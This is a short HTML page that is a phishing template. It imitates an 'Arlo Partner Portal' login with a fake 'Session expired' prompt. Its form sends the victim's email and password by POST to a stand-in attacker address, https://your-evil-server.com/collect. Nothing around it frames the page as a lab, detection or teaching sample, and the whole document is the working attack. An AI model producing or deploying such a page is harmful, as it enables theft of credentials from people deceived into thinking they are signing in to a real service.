<!DOCTYPE html>
<html>
<head><title>Arlo Partner Portal</title></head>
<body style="background: #0a0a0a; font-family: Arial; text-align: center; padding-top: 100px;">
<div style="max-width: 400px; margin: auto; background: white; padding: 30px; border-radius: 10px;">
<h2>Secure Partner Authentication</h2>
<p>Session expired. Please log in again.</p>
<form action="https://your-evil-server.com/collect" method="POST">
<input type="email" name="email" placeholder="Partner Email" required style="width:100%; padding:10px; margin:10px 0;">
<input type="password" name="password" placeholder="Password" required style="width:100%; padding:10px; margin:10px 0;">
<button type="submit" style="background:#2ea44f; color:white; padding:10px; width:100%; border:none;">Login</button>
</form>
</div>
</body>
</html>
